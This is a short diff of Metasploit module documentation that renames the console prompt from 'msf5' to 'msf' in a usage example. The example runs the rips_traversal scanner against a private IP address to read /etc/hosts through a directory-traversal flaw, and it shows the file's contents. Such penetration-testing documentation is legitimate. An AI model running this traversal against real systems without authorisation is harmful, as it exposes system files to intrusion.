@@ -24,12 +24,12 @@
 ## Scenarios
 
   ```
-  msf5 > use auxiliary/scanner/http/rips_traversal
-  msf5 auxiliary(scanner/http/rips_traversal) > set rhosts 172.16.191.188
+  msf > use auxiliary/scanner/http/rips_traversal
+  msf auxiliary(scanner/http/rips_traversal) > set rhosts 172.16.191.188
   rhosts => 172.16.191.188
-  msf5 auxiliary(scanner/http/rips_traversal) > set filepath /etc/hosts
+  msf auxiliary(scanner/http/rips_traversal) > set filepath /etc/hosts
   filepath => /etc/hosts
-  msf5 auxiliary(scanner/http/rips_traversal) > run
+  msf auxiliary(scanner/http/rips_traversal) > run
   
    127.0.0.1        localhost
     
